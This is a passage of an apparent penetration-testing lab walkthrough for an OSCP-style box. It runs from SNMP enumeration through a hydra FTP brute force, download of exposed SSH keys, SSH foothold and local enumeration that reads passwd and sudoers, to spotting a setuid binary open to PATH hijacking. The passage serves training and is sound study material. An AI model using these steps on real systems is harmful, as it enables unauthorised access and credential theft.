+<span class="w">  </span>snmpget<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$c</span><span class="s2">&quot;</span><span class="w"> </span>-t<span class="w"> </span><span class="m">4</span><span class="w"> </span>-r<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="m">192</span>.168.245.149<span class="w"> </span><span class="m">1</span>.3.6.1.2.1.1.5.0
+<span class="k">done</span>
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">kiero        Timeout: No Response from 192.168.245.149.
+oscp         Timeout: No Response from 192.168.245.149.
+oscp.exam    Timeout: No Response from 192.168.245.149.
+student      Timeout: No Response from 192.168.245.149.
+cl5          Timeout: No Response from 192.168.245.149.
+lab          Timeout: No Response from 192.168.245.149.
+public2      Timeout: No Response from 192.168.245.149.
+cisco        Timeout: No Response from 192.168.245.149.</span></pre></div>
+<p>Read-only access via <code>public</code> only. The path forward is the credential hint, not SNMP writes.</p>
+<hr />
+<h3>Result of this chapter</h3>
+<table>
+<thead>
+<tr>
+<th>Artefact</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Community string</td>
+<td><code>public</code> (read-only)</td>
+</tr>
+<tr>
+<td>Username</td>
+<td><strong><code>kiero</code></strong></td>
+</tr>
+<tr>
+<td>Password policy</td>
+<td><strong>default value</strong> — a fixed, known string</td>
+</tr>
+<tr>
+<td>Privesc candidate</td>
+<td><code>/home/john/RESET_PASSWD</code> (runs as root by design)</td>
+</tr>
+</tbody>
+</table>
+<p>→ <a href="#ch-04">04 — FTP</a>: apply the username to the one service that accepts passwords.</p></div></section>
+<section class="chapter" id="ch-04" data-title="FTP"><div class="ch-head"><span class="ch-num">04</span><div class="ch-title"><h2>FTP</h2><p class="ch-sub">Default credentials and exposed SSH keys</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>Chapter 03 produced a username (<code>kiero</code>) and a statement that its password is "the default value".
+This chapter cashes that in.</p>
+<hr />
+<h3>4.1 Anonymous access — ruled out properly</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ftp<span class="w"> </span>-n<span class="w"> </span>-v<span class="w"> </span><span class="m">192</span>.168.245.149<span class="w"> </span><span class="s">&lt;&lt;&#39;EOF&#39;</span>
+<span class="s">user anonymous anonymous@test.com</span>
+<span class="s">ls -la</span>
+<span class="s">pwd</span>
+<span class="s">bye</span>
+<span class="s">EOF</span>
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">Connected to 192.168.245.149.
+220 (vsFTPd 3.0.5)
+530 Permission denied.
+Login failed.
+530 Please login with USER and PASS.
+530 Please login with USER and PASS.
+ftp: Can't bind for data connection: Address already in use
+221 Goodbye.</span></pre></div>
+<p><strong>Reading it:</strong> <code>530 Permission denied</code> arrives immediately after the <code>USER anonymous</code> line, before
+any password is offered. In vsftpd that is the signature of <code>anonymous_enable=NO</code> — the server
+rejects the username outright rather than failing authentication later. No point pursuing it.</p>
+<p>(That <code>Can't bind for data connection: Address already in use</code> line is a client-side artifact of
+running the interactive client from a script, not a server response — ignore it.)</p>
+<h3>4.2 Applying the hint</h3>
+<p>The SNMP description said <code>kiero</code>'s password is reset to <em>the default value</em>. The brute-force step
+is therefore small and targeted, not a dictionary attack. A short list of plausible defaults, and
+critically, <strong>the account name as the password</strong> — the most common "default" on lab images.</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">printf</span><span class="w"> </span><span class="s2">&quot;kiero\njohn\n&quot;</span><span class="w"> </span>&gt;<span class="w"> </span>users.txt
+<span class="nb">printf</span><span class="w"> </span><span class="s2">&quot;kiero\nKiero\nkiero123\nKiero123\njohn\nJohn\njohn123\npassword\nPassword123\nPassword123!\nPassword1\nWelcome1\nchangeme\nP@ssw0rd\noffsec\nubuntu\ntoor\n123456\n&quot;</span><span class="w"> </span>&gt;<span class="w"> </span>pass.txt
+
+hydra<span class="w"> </span>-L<span class="w"> </span>users.txt<span class="w"> </span>-P<span class="w"> </span>pass.txt<span class="w"> </span>-t<span class="w"> </span><span class="m">4</span><span class="w"> </span>-f<span class="w"> </span>-V<span class="w"> </span>ftp://192.168.245.149
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">[21][ftp] host: 192.168.245.149   misc: (null)   login: kiero   password: kiero</span></pre></div>
+<p><strong>Reading it:</strong> <code>kiero:kiero</code> — account name as password. That is the "default value" the SNMP
+extend was describing. <code>-f</code> stops at the first hit, <code>-t 4</code> keeps the concurrency low so vsftpd's
+per-IP connection limits are not tripped (a common cause of false negatives on FTP).</p>
+<blockquote>
+<p>Before this, a hand-rolled loop of ten <code>curl -u</code> credential pairs (ftp:ftp, admin:admin,
+user:user, test:test, offsec:offsec, kali:kali, ubuntu:ubuntu, root:root, ftpuser:ftpuser,
+www-data:www-data) all failed — the account-specific default was the answer, which is exactly
+what the SNMP hint was steering toward.</p>
+</blockquote>
+<h3>4.3 What is in the directory</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-s<span class="w"> </span>-u<span class="w"> </span>kiero:kiero<span class="w"> </span><span class="s2">&quot;ftp://192.168.245.149/&quot;</span>
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">-rwxr-xr-x    1 114      119          2590 Nov 21  2022 id_rsa
+-rw-r--r--    1 114      119           563 Nov 21  2022 id_rsa.pub
+-rwxr-xr-x    1 114      119          2635 Nov 21  2022 id_rsa_2</span></pre></div>
+<p><strong>Reading it — this is the real finding:</strong></p>
+<ul>
+<li><strong>Two unencrypted SSH private keys</strong> sitting in a directory reachable by an FTP login. <code>id_rsa</code>
+  is even world-executable (<code>-rwxr-xr-x</code>), which is nonsense for key material and suggests a
+  careless copy.</li>
+<li>Numeric owner <code>114:119</code> = <code>ftp:ftp</code>. That places the directory at <code>/srv/ftp</code> — vsftpd's default
+  anonymous root — not in <code>kiero</code>'s home. Confirmed later from the shell:
+  <code>drwxr-xr-x 3 root root 4096 Nov 21  2022 /srv
+  drwxr-xr-x 2 ftp  ftp  4096 Nov 22  2022 /srv/ftp</code></li>
+<li>Timestamps <code>Nov 21 2022</code> match the box build date and the Apache <code>index.html</code>. Pre-seeded, not
+  dropped by a user.</li>
+<li><strong>The keys belong to a different account than the one we logged in as.</strong> That is the design
+  flaw: <code>kiero</code> is a low-value FTP account, and its directory contains <code>john</code>'s SSH key. One weak
+  password therefore compromises a second, more useful identity — privilege separation between
+  accounts is broken.</li>
+</ul>
+<h3>4.4 Identifying the keys before using them</h3>
+<p>Never point an unknown key at a host blindly; identify it first.</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>mkdir<span class="w"> </span>-p<span class="w"> </span>ftp_kiero<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">cd</span><span class="w"> </span>ftp_kiero
+<span class="k">for</span><span class="w"> </span>f<span class="w"> </span><span class="k">in</span><span class="w"> </span>id_rsa<span class="w"> </span>id_rsa.pub<span class="w"> </span>id_rsa_2<span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">  </span>curl<span class="w"> </span>-s<span class="w"> </span>-u<span class="w"> </span>kiero:kiero<span class="w"> </span>-o<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$f</span><span class="s2">&quot;</span><span class="w"> </span><span class="s2">&quot;ftp://192.168.245.149/</span><span class="nv">$f</span><span class="s2">&quot;</span>
+<span class="k">done</span>
+chmod<span class="w"> </span><span class="m">600</span><span class="w"> </span>id_rsa<span class="w"> </span>id_rsa_2
+
+ssh-keygen<span class="w"> </span>-l<span class="w"> </span>-f<span class="w"> </span>id_rsa
+ssh-keygen<span class="w"> </span>-l<span class="w"> </span>-f<span class="w"> </span>id_rsa_2
+cat<span class="w"> </span>id_rsa.pub
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">3072 SHA256:npk65kQbEjxsMC10v9qv/Lg6BU/q1vdeJLYw0C732p4 john@oscp (RSA)
+3072 SHA256:G7ci1SZ5dtLiavXDWI4flL1pXn5i0a5TN9fTUhY5FWA no comment (RSA)
+
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8J1/BFjH/Oet/zx+bKUUop1IuGd93QKio7Dt7Xl/...
+  ...XxVEK8oO3qu2pxa/e4izXBFc= john@oscp</span></pre></div>
+<p><strong>Reading it:</strong></p>
+<ul>
+<li><code>id_rsa</code> — 3072-bit RSA with comment <strong><code>john@oscp</code></strong>. The comment tells you the username and the
+  build. <code>chmod 600</code> is required or OpenSSH refuses to use it ("UNPROTECTED PRIVATE KEY FILE").</li>
+<li><code>id_rsa_2</code> — 3072-bit RSA, <strong>no comment</strong>. Unknown owner. Test it, but expect it to be a decoy:
+  keys placed in a challenge directory are often one working key plus one that is not in any
+  <code>authorized_keys</code>.</li>
+<li>The public key file matches <code>id_rsa</code>, confirming the pair.</li>
+</ul>
+<h3>4.5 Testing the keys</h3>
+<p>Try the obvious username for the commented key first.</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ssh<span class="w"> </span>-i<span class="w"> </span>id_rsa<span class="w"> </span>-o<span class="w"> </span><span class="nv">BatchMode</span><span class="o">=</span>yes<span class="w"> </span>-o<span class="w"> </span><span class="nv">StrictHostKeyChecking</span><span class="o">=</span>no<span class="w"> </span>john@192.168.245.149<span class="w"> </span><span class="s1">&#39;id&#39;</span>
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">uid=1000(john) gid=1000(john) groups=1000(john)</span></pre></div>
+<p>And confirm the decoy is a decoy (this is worth doing so you can state it as a fact):</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ssh<span class="w"> </span>-i<span class="w"> </span>id_rsa_2<span class="w"> </span>-o<span class="w"> </span><span class="nv">BatchMode</span><span class="o">=</span>yes<span class="w"> </span>-o<span class="w"> </span><span class="nv">StrictHostKeyChecking</span><span class="o">=</span>no<span class="w"> </span>john@192.168.245.149<span class="w"> </span><span class="s1">&#39;id&#39;</span>
+ssh<span class="w"> </span>-i<span class="w"> </span>id_rsa_2<span class="w"> </span>-o<span class="w"> </span><span class="nv">BatchMode</span><span class="o">=</span>yes<span class="w"> </span>-o<span class="w"> </span><span class="nv">StrictHostKeyChecking</span><span class="o">=</span>no<span class="w"> </span>kiero@192.168.245.149<span class="w"> </span><span class="s1">&#39;id&#39;</span>
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">john@192.168.245.149: Permission denied (publickey,password,keyboard-interactive).
+kiero@192.168.245.149: Permission denied (publickey,password,keyboard-interactive).</span></pre></div>
+<p><strong>Reading it:</strong> <code>id_rsa</code> is the working key; <code>id_rsa_2</code> is not in either account's
+<code>authorized_keys</code>. Also note the server advertises <code>publickey,password,keyboard-interactive</code> — the
+FTP password <code>kiero:kiero</code> was tested against SSH too and rejected, so the two services have
+separate credentials and the FTP password alone is not an SSH entry point.</p>
+<hr />
+<h3>Result of this chapter</h3>
+<table>
+<thead>
+<tr>
+<th>Artefact</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>FTP credential</td>
+<td><code>kiero:kiero</code></td>
+</tr>
+<tr>
+<td>Exposure</td>
+<td>two unencrypted RSA private keys in <code>/srv/ftp</code></td>
+</tr>
+<tr>
+<td>Working key</td>
+<td><code>id_rsa</code> → <code>john@oscp</code></td>
+</tr>
+<tr>
+<td>Decoy</td>
+<td><code>id_rsa_2</code> (no comment, not authorized anywhere)</td>
+</tr>
+<tr>
+<td>Design flaw</td>
+<td>weak FTP account's directory contains a <em>different</em> user's SSH key</td>
+</tr>
+</tbody>
+</table>
+<p>→ <a href="#ch-05">05 — Foothold</a></p></div></section>
+<section class="chapter" id="ch-05" data-title="Foothold"><div class="ch-head"><span class="ch-num">05</span><div class="ch-title"><h2>Foothold</h2><p class="ch-sub">Shell as john, then local enumeration</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>The key from chapter 04 authenticates as <code>john</code>. This chapter establishes the shell and does the
+local enumeration that identifies the privilege-escalation path.</p>
+<hr />
+<h3>5.1 Getting the shell</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ssh<span class="w"> </span>-i<span class="w"> </span>id_rsa<span class="w"> </span>-o<span class="w"> </span><span class="nv">StrictHostKeyChecking</span><span class="o">=</span>no<span class="w"> </span>john@192.168.245.149
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">Warning: Permanently added '192.168.245.149' (ED25519) to the list of known hosts.
+uid=1000(john) gid=1000(john) groups=1000(john)
+lab-pwk2-student-cl5-149-ubuntu1804-kiero-247-195
+/home/john</span></pre></div>
+<p>Shell as <code>john</code>, uid 1000. Nothing to upgrade — this is a real interactive shell, not a web
+callback, so no TTY juggling is needed (though <code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code>
+is the standard move if you land through an exploit instead).</p>
+<h3>5.2 Local enumeration</h3>
+<p>One pass, saved to a script and piped over SSH so it runs in a single connection and produces one
+readable report. Writing the script locally and sending it with <code>bash -s</code> avoids quoting hell and
+leaves no file on the target.</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="c1">## on Kali</span>
+cat<span class="w"> </span>&gt;<span class="w"> </span>enum1.sh<span class="w"> </span><span class="s">&lt;&lt;&#39;EOS&#39;</span>
+<span class="s">echo &quot;===== ID =====&quot;</span>
+<span class="s">id; whoami</span>
+<span class="s">echo &quot;===== OS =====&quot;</span>
+<span class="s">cat /etc/os-release | head -6; uname -a</span>
+<span class="s">echo &quot;===== SUDO =====&quot;</span>
+<span class="s">sudo -n -l 2&gt;&amp;1 | head -20</span>
+<span class="s">echo &quot;===== HOME =====&quot;</span>
+<span class="s">ls -la /home/john</span>
+<span class="s">echo &quot;===== FLAGS =====&quot;</span>
+<span class="s">find / -name &quot;local.txt&quot; -o -name &quot;proof.txt&quot; 2&gt;/dev/null | head</span>
+<span class="s">echo &quot;===== SUID =====&quot;</span>
+<span class="s">find / -perm -4000 -type f 2&gt;/dev/null</span>
+<span class="s">echo &quot;===== CAPABILITIES =====&quot;</span>
+<span class="s">getcap -r / 2&gt;/dev/null | head -20</span>
+<span class="s">echo &quot;===== CRON =====&quot;</span>
+<span class="s">cat /etc/crontab 2&gt;/dev/null; ls -la /etc/cron.* 2&gt;/dev/null</span>
+<span class="s">echo &quot;===== LISTENING =====&quot;</span>
+<span class="s">ss -tlnp 2&gt;/dev/null || netstat -tlnp 2&gt;/dev/null</span>
+<span class="s">echo &quot;===== USERS =====&quot;</span>
+<span class="s">cat /etc/passwd | grep -E &quot;sh$|bash$&quot;</span>
+<span class="s">echo &quot;===== SUDOERS =====&quot;</span>
+<span class="s">cat /etc/sudoers 2&gt;/dev/null | grep -v &quot;^#&quot; | grep -v &quot;^$&quot;</span>
+<span class="s">echo &quot;===== /opt /srv /var/www =====&quot;</span>
+<span class="s">ls -la /opt /srv /var/www 2&gt;/dev/null</span>
+<span class="s">EOS</span>
+
+ssh<span class="w"> </span>-i<span class="w"> </span>ftp_kiero/id_rsa<span class="w"> </span>john@192.168.245.149<span class="w"> </span><span class="s1">&#39;bash -s&#39;</span><span class="w"> </span>&lt;<span class="w"> </span>enum1.sh
+</pre></div>
+<h4>Output — identity and OS</h4>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">===== ID =====
+uid=1000(john) gid=1000(john) groups=1000(john)
+john
+
+===== OS =====
+NAME="Ubuntu"
+VERSION="20.04.5 LTS (Focal Fossa)"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu 20.04.5 LTS"
+VERSION_ID="20.04"
+Linux lab-pwk2-student-cl5-149-ubuntu1804-kiero-247-195 5.9.0-050900-generic
+  #202010112230 SMP Sun Oct 11 22:34:01 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span></pre></div>
+<p><strong>Reading it:</strong> Focal 20.04.5 with a <em>mainline</em> 5.9 kernel (<code>5.9.0-050900-generic</code>), not the
+Ubuntu-signed <code>5.4.0-xx</code>. A mainline kernel on 20.04 usually means it was swapped in deliberately —
+worth noting, but <code>dirtypipe</code> (CVE-2022-0847) needs kernels before 5.16.11, so only if we needed a
+kernel exploit, which we will not.</p>
+<p>No supplementary groups at all — <code>groups=1000(john)</code> only. So no <code>docker</code>, <code>lxd</code>, <code>disk</code>,
+<code>adm</code>, or <code>sudo</code> group shortcuts.</p>
+<h4>Output — sudo and home directory</h4>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">===== SUDO =====
+sudo: a password is required
+
+===== HOME =====
+total 64
+drwxr-xr-x 4 john john  4096 Nov 22  2022 .
+drwxr-xr-x 5 root root  4096 Nov 14 18:33 ..
+lrwxrwxrwx 1 root root     9 Nov 21  2022 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 john john   220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 john john  3771 Feb 25  2020 .bashrc
+drwx------ 2 john john  4096 Nov  2  2022 .cache
+-rw------- 1 john john    33 Nov 17  2022 .lesshst
+-rw-r--r-- 1 john john   807 Feb 25  2020 .profile
+drwx------ 2 john john  4096 Nov 21  2022 .ssh
+-rw------- 1 john john   816 Nov 22  2022 .viminfo
+-rw-rw-r-- 1 john john   257 Nov 22  2022 .wget-hsts
+-rwsrwsr-x 1 root root 16792 Nov 21  2022 RESET_PASSWD
+-rw-r--r-- 1 john john    33 Nov 14 18:35 local.txt</span></pre></div>
+<p>Two things jump out immediately:</p>
+<ol>
+<li><strong><code>-rwsrwsr-x 1 root root 16792 RESET_PASSWD</code></strong> — setuid <strong>and</strong> setgid root, owned by root,
+   executable by everyone, sitting in a user's writable home directory. This is the binary named in
+   the SNMP extend. It is the intended privesc.</li>
+<li><code>.bash_history -&gt; /dev/null</code> — history is deliberately discarded, so there is no shell history
+   to mine for credentials. This box has been cleaned.</li>
+</ol>
+<p>Also note <code>local.txt</code> exists already (33 bytes, modified <code>Nov 14 18:35</code> — the box writes it on
+first boot/redeploy).</p>
+<h4>Output — SUID inventory (filtered)</h4>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">===== SUID =====
+/home/john/RESET_PASSWD
+/usr/bin/mount
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/fusermount
+/usr/bin/pkexec
+/usr/bin/gpasswd
+/usr/bin/umount
+/usr/bin/su
+/usr/bin/chfn
+/usr/bin/at
+/usr/bin/sudo
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/snap/core18/... (snap duplicates of the above)
+/snap/core20/... (snap duplicates of the above)</span></pre></div>
+<p><strong>Reading it:</strong> everything except the first line is stock Ubuntu — <code>mount</code>, <code>su</code>, <code>passwd</code>,
+<code>sudo</code>, <code>pkexec</code> are all setuid by default. <code>pkexec</code> is CVE-2021-4034 (<code>PwnKit</code>) but this
+<code>policykit-1</code> build on patched 20.04 does not respond to the standard PoC; more importantly, the
+box is handing us a blatant custom SUID binary, so there is no reason to bother.</p>
+<p>The <code>find / -perm -4000</code> output is long because of the snap mounts. Filter it next time:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s2">&quot;^/snap&quot;</span>
+</pre></div>
+<h4>Output — capabilities and cron</h4>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">===== CAPABILITIES =====
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep</span></pre></div>
+<p>Nothing interesting — no <code>cap_setuid</code> on a user-writable binary, which is the other classic
+one-liner.</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">===== CRON =====
+17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )</span></pre></div>
+<p>Only the stock <code>run-parts</code> jobs, and <code>/etc/cron.hourly</code> contains just <code>.placeholder</code>. No writable
+cron script, no root cron in a user directory. Cron is not the path.</p>
+<h4>Output — listeners, users, sudoers</h4>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">===== LISTENING =====
+LISTEN 0 511        0.0.0.0:80        0.0.0.0:*
+LISTEN 0 4096 127.0.0.53%lo:53       0.0.0.0:*
+LISTEN 0 128        0.0.0.0:22        0.0.0.0:*
+LISTEN 0 32               *:21              *:*
+LISTEN 0 128           [::]:22           [::]:*
+
+===== USERS =====
+root:x:0:0:root:/root:/bin/bash
+john:x:1000:1000:john:/home/john:/bin/bash
+kiero:x:1001:1001::/home/kiero:/bin/bash
+ubuntu:x:1002:1003:Ubuntu:/home/ubuntu:/bin/bash</span></pre></div>
+<p><strong>Reading it:</strong></p>
+<ul>
+<li>Only the three services already known, all on all interfaces. No localhost-only service to
+  tunnel to — this box has no internal-only attack surface.</li>
+<li><code>127.0.0.53:53</code> is <code>systemd-resolved</code>, not a real DNS server.</li>
+<li><strong><code>kiero</code> is a real local account</strong> (uid 1001, shell <code>/bin/bash</code>), confirming the SNMP hint was
+  about a genuine login. Its home is <code>/home/kiero</code> — which is <em>not</em> where the FTP login lands, since
+  vsftpd is configured with <code>/srv/ftp</code>. That is why <code>kiero</code>'s FTP session exposed a shared
+  directory containing <code>john</code>'s key.</li>
+<li><code>ubuntu</code> (uid 1002) is the cloud-image default account.</li>
+</ul>
+<p><code>cat /etc/sudoers</code> produced no output at all — <code>john</code> cannot read it, which is itself the answer:
+no readable sudoers rules and <code>sudo -n -l</code> needed a password. No sudo path.</p>
+<h4>Output — application directories</h4>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">===== /opt /srv /var/www =====
+/opt:
+total 8
+drwxr-xr-x  2 root root 4096 Jul 31  2020 .
+drwxr-xr-x 19 root root 4096 Nov 14 18:33 ..
+
+/srv:
+total 12
+drwxr-xr-x  3 root root 4096 Nov 21  2022 .
+drwxr-xr-x 19 root root 4096 Nov 14 18:33 ..
+drwxr-xr-x  2 ftp  ftp  4096 Nov 22  2022 ftp
+
+/var/www:
+total 12
+drwxr-xr-x  3 root root 4096 Nov 21  2022 .
+drwxr-xr-x 15 root root 4096 Nov 21  2022 ..
+drwxr-xr-x  2 root root 4096 Nov 21  2022 html</span></pre></div>
+<p>Empty <code>/opt</code>, <code>/var/www/html</code> is the stock page, and <code>/srv/ftp</code> is the FTP root we already looted.
+No third-party application anywhere on the filesystem.</p>
+<h3>5.3 Triage summary</h3>
+<table>
+<thead>
+<tr>
+<th>Vector</th>
+<th>Result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>sudo</td>
+<td>password required, sudoers unreadable → dead</td>
+</tr>
+<tr>
+<td>SUID</td>
+<td><strong>custom <code>/home/john/RESET_PASSWD</code>, setuid+setgid root</strong> → live candidate</td>
+</tr>
+<tr>
+<td>Capabilities</td>
+<td>only stock <code>ping</code>/<code>mtr</code> → dead</td>
+</tr>
+<tr>
+<td>Cron</td>
+<td>stock <code>run-parts</code> only, nothing writable → dead</td>
+</tr>
+<tr>
+<td>Kernel</td>
+<td>5.9 mainline; no need</td>
+</tr>
+<tr>
+<td>Local services</td>
+<td>none beyond the known three</td>
+</tr>
+<tr>
+<td>Credentials in files</td>
+<td><code>.bash_history</code> → <code>/dev/null</code>, nothing to mine</td>
+</tr>
+</tbody>
+</table>
+<p>The box is pointing at one thing. → <a href="#ch-06">06 — Privilege escalation</a></p></div></section>
+<section class="chapter" id="ch-06" data-title="Privilege escalation"><div class="ch-head"><span class="ch-num">06</span><div class="ch-title"><h2>Privilege escalation</h2><p class="ch-sub">setuid + system() = PATH hijack</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>The only non-stock finding from local enumeration was
+<code>/home/john/RESET_PASSWD</code>, a setuid <strong>and</strong> setgid root binary in a user's home directory. This
+chapter takes it apart and turns it into root.</p>
+<hr />
+<h3>6.1 The target</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ls<span class="w"> </span>-l<span class="w"> </span>/home/john/RESET_PASSWD
+file<span class="w"> </span>/home/john/RESET_PASSWD
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">-rwsrwsr-x 1 root root 16792 Nov 21  2022 /home/john/RESET_PASSWD
+/home/john/RESET_PASSWD: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV),
+  dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
+  BuildID[sha1]=1fce3b4f2c8144ff27ecf785e711c7eb5fa2aaee, for GNU/Linux 3.2.0, not stripped</span></pre></div>
+<p><strong>Reading the mode string <code>-rwsrwsr-x</code>:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Position</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>rws</code> (owner)</td>
+<td>owner is <code>root</code>, <strong>setuid bit set</strong> — the process gets <code>euid=0</code></td>
+</tr>
+<tr>
+<td><code>rws</code> (group)</td>
+<td>group is <code>root</code>, <strong>setgid bit set</strong> — the process gets <code>egid=0</code></td>
+</tr>
+<tr>
+<td><code>r-x</code> (other)</td>
+<td><strong>world-executable</strong> — every local user can run it</td>
+</tr>
+</tbody>
+</table>
+<p>Setuid <strong>and</strong> setgid on the same binary is unusual and a strong signal by itself. World-executable
+means it is usable by our unprivileged account, no group membership required.</p>
+<p><code>not stripped</code> is the best news here: function names survive, so analysis is direct.</p>
+<h3>6.2 Strings</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>strings<span class="w"> </span>-a<span class="w"> </span>/home/john/RESET_PASSWD<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-40
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">/lib64/ld-linux-x86-64.so.2
+libc.so.6
+setuid
+system
+__cxa_finalize
+setgid
+__libc_start_main
+GLIBC_2.2.5
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_ITM_registerTMCloneTable
+[]A\A]A^A_
+echo kiero:kiero | chpasswd
+echo Resetting password of 'kiero' to the default value
+GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0
+crtstuff.c
+deregister_tm_clones
+__do_global_dtors_aux
+completed.8061
+__do_global_dtors_aux_fini_array_entry
+frame_dummy
+__frame_dummy_init_array_entry
+RESET_PASSWD.c
+__FRAME_END__
+__init_array_end
+_DYNAMIC
+__init_array_start
+__GNU_EH_FRAME_HDR
+_GLOBAL_OFFSET_TABLE_
+__libc_start_main
+_edata
+setuid@@GLIBC_2.2.5
+system@@GLIBC_2.2.5</span></pre></div>
+<p>Three lines decide the whole box:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">setuid
+system
+echo kiero:kiero | chpasswd</span></pre></div>
+<p><strong>Reading it:</strong> the program is a ~20-line C file (<code>RESET_PASSWD.c</code>) that calls <code>setuid(0)</code>, then
+<code>system()</code> on a fixed string. The string pipes <code>kiero:kiero</code> into <strong><code>chpasswd</code></strong> — and <code>chpasswd</code> is
+a bare command name with <strong>no path</strong>. That is the bug.</p>
+<h3>6.3 Confirming with the disassembly</h3>
+<p>Copying the binary locally (read-only on the target) and disassembling <code>main</code>:</p>
